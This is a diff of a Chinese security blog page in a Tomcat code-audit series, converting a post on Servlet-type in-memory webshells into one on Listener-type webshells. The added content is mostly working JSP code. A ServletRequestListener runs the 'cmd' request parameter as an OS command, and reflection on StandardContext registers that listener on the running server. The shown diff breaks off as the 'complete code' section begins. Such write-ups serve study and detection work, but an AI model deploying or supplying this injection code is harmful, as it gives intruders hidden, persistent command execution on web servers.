@@ -3,7 +3,7 @@
 <head>
 <meta charset="utf-8"/>
 <meta content="width=device-width, initial-scale=1" name="viewport"/>
-<title>Tomcat的servletAPI型内存马研究 – ZDoc</title>
+<title>Tomcat的Linstener型内存马研究 – ZDoc</title>
 <script defer="" src="/js/fuse.min.94c78ad70b02749822921660cf4e9f0b3701bc0680c421afb784a78228de0275.js"></script>
 <script src="/js/enquire.min.dfb99dee1e029d51d6cfb672d847929890b1585402de17f5ed092edd72a688b4.js"></script>
 <script defer="" src="/js/lazysizes.min.31dd6a2d3a1ec0f78a8df007535cf23f03aeb5c70f026e6d6a19dac3b3acc340.js"></script>
@@ -18,7 +18,7 @@
     
     var baseurl = JSON.parse("\"http://crkmythical.github.io\"");
     
-    var permalink = JSON.parse("\"http://crkmythical.github.io/dso/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/tomcat%E7%9A%84servletapi%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC%E7%A0%94%E7%A9%B6-%E8%AF%A6%E7%BB%86%E7%89%88/\"");
+    var permalink = JSON.parse("\"http://crkmythical.github.io/dso/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/tomcat%E7%9A%84linstener%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC%E7%A0%94%E7%A9%B6/\"");
 
     
     var toggleSidebarElem = document.getElementById("toggle-sidebar");
@@ -1055,19 +1055,18 @@
   }
 </script>
 <link href="/css/main.min.css" rel="stylesheet"/>
-<meta content="先是创建了一个恶意的servlet，然后获取当前的StandardContext，然后将恶意servlet封装成wrapper添加到StandardContext的children当中，最后添加ServletMapping将访问的URL和wrapper进行绑定。" name="description"/>
+<meta content="" name="description"/>
 <meta content="" name="keywords"/>
 <meta content="0001-01-01T00:00:00+0000" name="created"/>
 <meta content="0001-01-01T00:00:00+0000" name="modified"/>
-<meta content="crkmyth1cal" name="author"/>
 <meta content="ZDoc" property="og:site_name"/>
-<meta content="Tomcat的servletAPI型内存马研究" property="og:title"/>
-<meta content="http://crkmythical.github.io/dso/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/tomcat%E7%9A%84servletapi%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC%E7%A0%94%E7%A9%B6-%E8%AF%A6%E7%BB%86%E7%89%88/" property="og:url"/>
+<meta content="Tomcat的Linstener型内存马研究" property="og:title"/>
+<meta content="http://crkmythical.github.io/dso/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/tomcat%E7%9A%84linstener%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC%E7%A0%94%E7%A9%B6/" property="og:url"/>
 <meta content="article" property="og:type"/>
 <meta content="Hugo 0.92.1" name="generator"/>
 <meta content="#ffffff" name="msapplication-TileColor"/>
 <meta content="#ffffff" name="theme-color"/>
-<link href="http://crkmythical.github.io/dso/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/tomcat%E7%9A%84servletapi%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC%E7%A0%94%E7%A9%B6-%E8%AF%A6%E7%BB%86%E7%89%88/" rel="canonical"/>
+<link href="http://crkmythical.github.io/dso/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/tomcat%E7%9A%84linstener%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC%E7%A0%94%E7%A9%B6/" rel="canonical"/>
 <link href="/manifest.json" rel="manifest"/>
 <link href="/favicon/apple-icon-57x57.png" rel="apple-touch-icon" sizes="57x57"/>
 <link href="/favicon/apple-icon-60x60.png" rel="apple-touch-icon" sizes="60x60"/>
@@ -1089,15 +1088,11 @@
   {
     "@context": "https://schema.org",
     "@type": "WebPage",
-    "headline": "Tomcat的servletAPI型内存马研究",
+    "headline": "Tomcat的Linstener型内存马研究",
     "datePublished": "0001-01-01T00:00:00Z",
     "dateModified": "0001-01-01T00:00:00Z",
-    "url" : "http://crkmythical.github.io/dso/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/tomcat%E7%9A%84servletapi%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC%E7%A0%94%E7%A9%B6-%E8%AF%A6%E7%BB%86%E7%89%88/",
-    "description": "先是创建了一个恶意的servlet，然后获取当前的StandardContext，然后将恶意servlet封装成wrapper添加到StandardContext的children当中，最后添加ServletMapping将访问的URL和wrapper进行绑定。",
-    "author": {
-      "@type": "Person",
-      "name": "crkmyth1cal"
-    },
+    "url" : "http://crkmythical.github.io/dso/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/tomcat%E7%9A%84linstener%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC%E7%A0%94%E7%A9%B6/",
+    "description": "\u003cp\u003eBeijing: ☀️   🌡️+31°C 🌬️↖11km/h\u003c/p\u003e \u003cp\u003e目前Java内存马的全流程已经有完善的解决方案了：\u003c/p\u003e \u003cul\u003e \u003cli\u003e第一步，获取当前请求的HttpRequest对象或tomcat的StandardContext对象(Weblogic下是ServletContext对象)，SpringMVC和SpringBoot下注入controller …\u003c/li\u003e\u003c/ul\u003e",
     "mainEntityOfPage": {
       "@type": "WebPage",
       "@id": "http://crkmythical.github.io"
@@ -1139,7 +1134,7 @@
 <div class="menu">
 <h6 class="menu__label">
     
-      Tomcat的servletAPI型内存马研究
+      Tomcat的Linstener型内存马研究
     
   </h6>
 <ul>
@@ -1151,7 +1146,7 @@
 <svg height="22" viewbox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M9.29 15.88L13.17 12 9.29 8.12c-.39-.39-.39-1.02 0-1.41.39-.39 1.02-.39 1.41 0l4.59 4.59c.39.39.39 1.02 0 1.41L10.7 17.3c-.39.39-1.02.39-1.41 0-.38-.39-.39-1.03 0-1.42z" fill="currentColor"></path></svg>
 </span>
 </li>
-<ul class="menu__list active" data-data="/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" data-link="http://crkmythical.github.io/dso/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/tomcat%E7%9A%84servletapi%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC%E7%A0%94%E7%A9%B6-%E8%AF%A6%E7%BB%86%E7%89%88/">
+<ul class="menu__list active" data-data="/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" data-link="http://crkmythical.github.io/dso/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/tomcat%E7%9A%84linstener%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC%E7%A0%94%E7%A9%B6/">
 <li>
 <a class="menu__title" data-depth="0" href="http://crkmythical.github.io/dso/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/01-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">代码审计环境配置-1</a>
 </li>
@@ -1177,7 +1172,13 @@
 <a class="menu__title" data-depth="0" href="http://crkmythical.github.io/dso/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/owasp-benchmark%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA/">OWASP Benchmark靶场搭建</a>
 </li>
 <li>
-<a class="menu__title active" data-depth="0" href="http://crkmythical.github.io/dso/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/tomcat%E7%9A%84servletapi%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC%E7%A0%94%E7%A9%B6-%E8%AF%A6%E7%BB%86%E7%89%88/">Tomcat的servletAPI型内存马研究</a>
+<a class="menu__title" data-depth="0" href="http://crkmythical.github.io/dso/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/tomcat%E7%9A%84filter%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC%E7%A0%94%E7%A9%B6/">Tomcat的Filter型内存马研究</a>
+</li>
+<li>
+<a class="menu__title active" data-depth="0" href="http://crkmythical.github.io/dso/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/tomcat%E7%9A%84linstener%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC%E7%A0%94%E7%A9%B6/">Tomcat的Linstener型内存马研究</a>
+</li>
+<li>
+<a class="menu__title" data-depth="0" href="http://crkmythical.github.io/dso/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/tomcat%E7%9A%84servlet%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC%E7%A0%94%E7%A9%B6-%E8%AF%A6%E7%BB%86%E7%89%88/">Tomcat的servletAPI型内存马研究</a>
 </li>
 <li>
 <a class="menu__title" data-depth="0" href="http://crkmythical.github.io/dso/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%89%E8%A3%85tomcat-macos%E7%89%88/">安装Tomcat-macOS版</a>
@@ -1194,7 +1195,7 @@
 <svg height="22" viewbox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M9.29 15.88L13.17 12 9.29 8.12c-.39-.39-.39-1.02 0-1.41.39-.39 1.02-.39 1.41 0l4.59 4.59c.39.39.39 1.02 0 1.41L10.7 17.3c-.39.39-1.02.39-1.41 0-.38-.39-.39-1.03 0-1.42z" fill="currentColor"></path></svg>
 </span>
 </li>
-<ul class="menu__list" data-data="/contentmanagement/" data-link="http://crkmythical.github.io/dso/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/tomcat%E7%9A%84servletapi%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC%E7%A0%94%E7%A9%B6-%E8%AF%A6%E7%BB%86%E7%89%88/">
+<ul class="menu__list" data-data="/contentmanagement/" data-link="http://crkmythical.github.io/dso/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/tomcat%E7%9A%84linstener%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC%E7%A0%94%E7%A9%B6/">
 <li>
 <a class="menu__title" data-depth="0" href="http://crkmythical.github.io/dso/contentmanagement/shortcodes/">Shortcodes</a>
 </li>
@@ -1462,7 +1463,7 @@
 <div class="header__wrapper bgcolor__header">
 <div class="divider">
 <div class="lmr">
-<h2 class="title">Tomcat的servletAPI型内存马研究</h2>
+<h2 class="title">Tomcat的Linstener型内存马研究</h2>
 </div>
 </div>
 </div>
@@ -1481,7 +1482,7 @@
 </span>
 </span>
 </label>
-<a href="https://github.com/crkmythical/Frame/tree/main/content/dso/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/tomcat%E7%9A%84servletapi%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC%E7%A0%94%E7%A9%B6-%E8%AF%A6%E7%BB%86%E7%89%88.md" rel="noreferrer" target="_blank">
+<a href="https://github.com/crkmythical/Frame/tree/main/content/dso/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/tomcat%E7%9A%84linstener%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC%E7%A0%94%E7%A9%B6.md" rel="noreferrer" target="_blank">
 <button aria-label="Edit This Page Button" class="editBtn">
         EDIT THIS PAGE
       </button>
@@ -1496,7 +1497,7 @@
 <div class="menu">
 <h6 class="menu__label">
     
-      Tomcat的servletAPI型内存马研究
+      Tomcat的Linstener型内存马研究
     
   </h6>
 <ul>
@@ -1508,7 +1509,7 @@
 <svg height="22" viewbox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M9.29 15.88L13.17 12 9.29 8.12c-.39-.39-.39-1.02 0-1.41.39-.39 1.02-.39 1.41 0l4.59 4.59c.39.39.39 1.02 0 1.41L10.7 17.3c-.39.39-1.02.39-1.41 0-.38-.39-.39-1.03 0-1.42z" fill="currentColor"></path></svg>
 </span>
 </li>
-<ul class="menu__list active" data-data="/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" data-link="http://crkmythical.github.io/dso/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/tomcat%E7%9A%84servletapi%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC%E7%A0%94%E7%A9%B6-%E8%AF%A6%E7%BB%86%E7%89%88/">
+<ul class="menu__list active" data-data="/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" data-link="http://crkmythical.github.io/dso/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/tomcat%E7%9A%84linstener%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC%E7%A0%94%E7%A9%B6/">
 <li>
 <a class="menu__title" data-depth="0" href="http://crkmythical.github.io/dso/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/01-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">代码审计环境配置-1</a>
 </li>
@@ -1534,7 +1535,13 @@
 <a class="menu__title" data-depth="0" href="http://crkmythical.github.io/dso/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/owasp-benchmark%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA/">OWASP Benchmark靶场搭建</a>
 </li>
 <li>
-<a class="menu__title active" data-depth="0" href="http://crkmythical.github.io/dso/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/tomcat%E7%9A%84servletapi%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC%E7%A0%94%E7%A9%B6-%E8%AF%A6%E7%BB%86%E7%89%88/">Tomcat的servletAPI型内存马研究</a>
+<a class="menu__title" data-depth="0" href="http://crkmythical.github.io/dso/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/tomcat%E7%9A%84filter%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC%E7%A0%94%E7%A9%B6/">Tomcat的Filter型内存马研究</a>
+</li>
+<li>
+<a class="menu__title active" data-depth="0" href="http://crkmythical.github.io/dso/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/tomcat%E7%9A%84linstener%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC%E7%A0%94%E7%A9%B6/">Tomcat的Linstener型内存马研究</a>
+</li>
+<li>
+<a class="menu__title" data-depth="0" href="http://crkmythical.github.io/dso/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/tomcat%E7%9A%84servlet%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC%E7%A0%94%E7%A9%B6-%E8%AF%A6%E7%BB%86%E7%89%88/">Tomcat的servletAPI型内存马研究</a>
 </li>
 <li>
 <a class="menu__title" data-depth="0" href="http://crkmythical.github.io/dso/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%89%E8%A3%85tomcat-macos%E7%89%88/">安装Tomcat-macOS版</a>
@@ -1551,7 +1558,7 @@
 <svg height="22" viewbox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M9.29 15.88L13.17 12 9.29 8.12c-.39-.39-.39-1.02 0-1.41.39-.39 1.02-.39 1.41 0l4.59 4.59c.39.39.39 1.02 0 1.41L10.7 17.3c-.39.39-1.02.39-1.41 0-.38-.39-.39-1.03 0-1.42z" fill="currentColor"></path></svg>
 </span>
 </li>
-<ul class="menu__list" data-data="/contentmanagement/" data-link="http://crkmythical.github.io/dso/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/tomcat%E7%9A%84servletapi%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC%E7%A0%94%E7%A9%B6-%E8%AF%A6%E7%BB%86%E7%89%88/">
+<ul class="menu__list" data-data="/contentmanagement/" data-link="http://crkmythical.github.io/dso/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/tomcat%E7%9A%84linstener%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC%E7%A0%94%E7%A9%B6/">
 <li>
 <a class="menu__title" data-depth="0" href="http://crkmythical.github.io/dso/contentmanagement/shortcodes/">Shortcodes</a>
 </li>
@@ -1580,8 +1587,7 @@
 <article class="mr" data-dir="ltr" id="list-main">
 <div class="single" data-display="block">
 <article class="single__contents" data-dir="ltr">
-<p>Beijing: ☀️   🌡️+33°C 🌬️↑15km/h</p>
-<h1 id="tomcat的servletapi型内存马研究">Tomcat的servletAPI型内存马研究</h1>
+<p>Beijing: ☀️   🌡️+31°C 🌬️↖11km/h</p>
 <p>目前Java内存马的全流程已经有完善的解决方案了：</p>
 <ul>
 <li>第一步，获取当前请求的HttpRequest对象或tomcat的StandardContext对象(Weblogic下是ServletContext对象)，SpringMVC和SpringBoot下注入controller和interceptor则是获取到WebApplicationContext对象。</li>
@@ -1591,7 +1597,140 @@
 <p>向各种中间件和框架注入内存马的基础，就是要获得context，所谓context实际上就是拥有当前中间件或框架处理请求、保存和控制servlet对象、保存和控制filter对象等功能的对象。</p>
 <p>使用新增servlet的方式就需要绑定指定的URL，如果我们想要更加隐蔽，做到内存马与URL无关，<br/>
 那就得通过注入新的或修改已有的filter或者listener的方式来实现了。</p>
-<h2 id="创建恶意的servlet类">创建恶意的Servlet类</h2>
+<h1 id="tomcat的linstener型内存马研究">Tomcat的Linstener型内存马研究</h1>
+<p>Linstener型内存马的总体思路是：</p>
+<ol>
+<li>创建一个恶意类ListenerShell，继承ServletRequestListener类，重写<code>public void requestInitialized(ServletRequestEvent sre)</code>方法</li>
+<li>通过反射获取<code>ApplicationContext</code>, 然后再通过反射获取<code>StandardContext</code>对象</li>
+<li>调用<code>StandardContext#addApplicationEventListener</code>方法将<code>ListenerShell</code>添加进去</li>
+</ol>
+<p></p><p class="md__image">
+<img alt="" src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20220723094417.gif"/>
+</p>
+<h2 id="创建恶意类listenershell">创建恶意类<code>ListenerShell</code></h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma" tabindex="0"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma" tabindex="0"><code class="language-java" data-lang="java"><span class="o">&lt;%</span>  
+    <span class="kd">class</span> <span class="nc">ListenerShell</span> <span class="kd">implements</span> <span class="n">ServletRequestListener</span> <span class="o">{</span>  
+        <span class="nd">@Override</span>  
+        <span class="kd">public</span> <span class="kt">void</span> <span class="nf">requestDestroyed</span><span class="o">(</span><span class="n">ServletRequestEvent</span> <span class="n">sre</span><span class="o">)</span> <span class="o">{</span>  
+            <span class="n">ServletRequestListener</span><span class="o">.</span><span class="na">super</span><span class="o">.</span><span class="na">requestDestroyed</span><span class="o">(</span><span class="n">sre</span><span class="o">);</span>  
+            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"销毁。。。"</span><span class="o">);</span>  
+        <span class="o">}</span>  
+        <span class="nd">@Override</span>  
+        <span class="kd">public</span> <span class="kt">void</span> <span class="nf">requestInitialized</span><span class="o">(</span><span class="n">ServletRequestEvent</span> <span class="n">sre</span><span class="o">)</span> <span class="o">{</span>  
+            <span class="n">ServletRequestListener</span><span class="o">.</span><span class="na">super</span><span class="o">.</span><span class="na">requestInitialized</span><span class="o">(</span><span class="n">sre</span><span class="o">);</span>  
+            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"初始化。。。"</span><span class="o">);</span>  
+            <span class="k">if</span> <span class="o">(</span> <span class="n">sre</span><span class="o">.</span><span class="na">getServletRequest</span><span class="o">().</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"cmd"</span><span class="o">)</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">){</span>  
+  
+                <span class="kt">boolean</span> <span class="n">isWin</span> <span class="o">=</span> <span class="n">System</span><span class="o">.</span><span class="na">getProperty</span><span class="o">(</span><span class="s">"os.name"</span><span class="o">).</span><span class="na">toLowerCase</span><span class="o">().</span><span class="na">contains</span><span class="o">(</span><span class="s">"win"</span><span class="o">);</span>  
+                <span class="n">String</span><span class="o">[]</span> <span class="n">cmds</span> <span class="o">=</span> <span class="n">isWin</span> <span class="o">?</span> <span class="k">new</span> <span class="n">String</span><span class="o">[]{</span><span class="s">"cmd.exe"</span><span class="o">,</span><span class="s">"/c"</span><span class="o">,</span> <span class="n">sre</span><span class="o">.</span><span class="na">getServletRequest</span><span class="o">().</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"cmd"</span><span class="o">)}</span>  
+                        <span class="o">:</span> <span class="k">new</span> <span class="n">String</span><span class="o">[]{</span><span class="s">"sh"</span><span class="o">,</span><span class="s">"-c"</span><span class="o">,</span><span class="n">sre</span><span class="o">.</span><span class="na">getServletRequest</span><span class="o">().</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"cmd"</span><span class="o">)};</span>  
+  
+                <span class="n">Scanner</span> <span class="n">scanner</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>  
+                <span class="k">try</span> <span class="o">{</span>  
+                    <span class="n">scanner</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Scanner</span><span class="o">(</span><span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="n">cmds</span><span class="o">).</span><span class="na">getInputStream</span><span class="o">()).</span><span class="na">useDelimiter</span><span class="o">(</span><span class="s">"\\A"</span><span class="o">);</span>  
+                <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">IOException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>  
+                    <span class="k">throw</span> <span class="k">new</span> <span class="n">RuntimeException</span><span class="o">(</span><span class="n">e</span><span class="o">);</span>  
+                <span class="o">}</span>                <span class="n">String</span> <span class="n">result</span> <span class="o">=</span> <span class="n">scanner</span><span class="o">.</span><span class="na">hasNext</span><span class="o">()</span> <span class="o">?</span> <span class="n">scanner</span><span class="o">.</span><span class="na">next</span><span class="o">()</span> <span class="o">:</span> <span class="s">""</span><span class="o">;</span>  
+                <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">result</span><span class="o">);</span>  
+            <span class="o">}</span>  
+        <span class="o">}</span>    <span class="o">}</span>  
+<span class="o">%&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="通过反射获取standardcontext对象">通过反射获取<code>StandardContext</code>对象</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma" tabindex="0"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma" tabindex="0"><code class="language-java" data-lang="java"><span class="o">&lt;%</span>  
+    <span class="c1">// 获取servletContext, 因为servletContext是接口类，所以获取的是它子实现类ApplicationContextFacade  
+</span><span class="c1"></span>    <span class="n">ServletContext</span> <span class="n">servletContext</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getSession</span><span class="o">().</span><span class="na">getServletContext</span><span class="o">();</span>  
+    <span class="c1">// 通过反射获取ApplicationContextFacade的私有属性context字段,类型ApplicationContext  
+</span><span class="c1"></span>    <span class="n">Field</span> <span class="n">appctx_context</span> <span class="o">=</span> <span class="n">servletContext</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"context"</span><span class="o">);</span>  
+    <span class="c1">// 设置appctx 禁止Java语言访问检查  
+</span><span class="c1"></span>    <span class="n">appctx_context</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>  
+    <span class="c1">// 通过反射获取字段值 - 获取字段appctx_context 在servletContext对象上的值，并强制类型转换ApplicationContext  
+</span><span class="c1"></span>    <span class="n">ApplicationContext</span> <span class="n">applicationContext</span> <span class="o">=</span> <span class="o">(</span><span class="n">ApplicationContext</span><span class="o">)</span> <span class="n">appctx_context</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">servletContext</span><span class="o">);</span>  
+  
+    <span class="c1">// 通过反射获取ApplicationContext的私有属性context字段，类型是StandardContext  
+</span><span class="c1"></span>    <span class="n">Field</span> <span class="n">stdctx_context</span> <span class="o">=</span> <span class="n">applicationContext</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"context"</span><span class="o">);</span>  
+    <span class="c1">// 设置stdctx_context 禁止Java语言访问检查  
+</span><span class="c1"></span>    <span class="n">stdctx_context</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>  
+  
+    <span class="c1">// 通过反射获取 stdctx_context 字段在 applicationContext类上对应的值，类型为Object，并强制转换为StandardContext  
+</span><span class="c1"></span>    <span class="n">StandardContext</span> <span class="n">standardContext</span> <span class="o">=(</span><span class="n">StandardContext</span><span class="o">)</span> <span class="n">stdctx_context</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">applicationContext</span><span class="o">);</span>  
+  
+<span class="o">%&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="调用standardcontextaddapplicationeventlistener方法将listenershell添加进去">调用<code>StandardContext#addApplicationEventListener</code>方法将<code>ListenerShell</code>添加进去</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma" tabindex="0"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma" tabindex="0"><code class="language-java" data-lang="java"><span class="o">&lt;%</span>
+    <span class="n">ListenerShell</span> <span class="n">servletRequestListener</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ListenerShell</span><span class="o">();</span>  
+    <span class="n">standardContext</span><span class="o">.</span><span class="na">addApplicationEventListener</span><span class="o">(</span><span class="n">servletRequestListener</span><span class="o">);</span>  
+    <span class="n">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"inject success"</span><span class="o">);</span>  
+<span class="o">%&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="完整代码">完整代码</h2>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre class="chroma" tabindex="0"><code><span class="lnt"> 1
@@ -1657,406 +1796,102 @@
 </span><span class="lnt">61
 </span><span class="lnt">62
 </span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma" tabindex="0"><code class="language-java" data-lang="java"><span class="o">&lt;%--</span>
+<pre class="chroma" tabindex="0"><code class="language-java" data-lang="java"><span class="o">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="n">import</span><span class="o">=</span><span class="s">"java.util.Scanner"</span> <span class="o">%&gt;</span>
+<span class="o">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="n">import</span><span class="o">=</span><span class="s">"java.io.IOException"</span> <span class="o">%&gt;</span>
+<span class="o">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="n">import</span><span class="o">=</span><span class="s">"java.lang.reflect.Field"</span> <span class="o">%&gt;</span>
+<span class="o">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="n">import</span><span class="o">=</span><span class="s">"org.apache.catalina.core.ApplicationContext"</span> <span class="o">%&gt;</span>
+<span class="o">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="n">import</span><span class="o">=</span><span class="s">"org.apache.catalina.core.StandardContext"</span> <span class="o">%&gt;</span>
+<span class="o">&lt;%--</span>
   <span class="n">Created</span> <span class="n">by</span> <span class="n">IntelliJ</span> <span class="n">IDEA</span><span class="o">.</span>
   <span class="n">User</span><span class="o">:</span> <span class="n">ding</span><span class="o">.</span><span class="na">fugui</span>
-  <span class="n">Date</span><span class="o">:</span> <span class="n">7</span><span class="o">/</span><span class="n">20</span><span class="o">/</span><span class="n">22</span>
-  <span class="n">Time</span><span class="o">:</span> <span class="n">11</span><span class="o">:</span><span class="n">34</span>
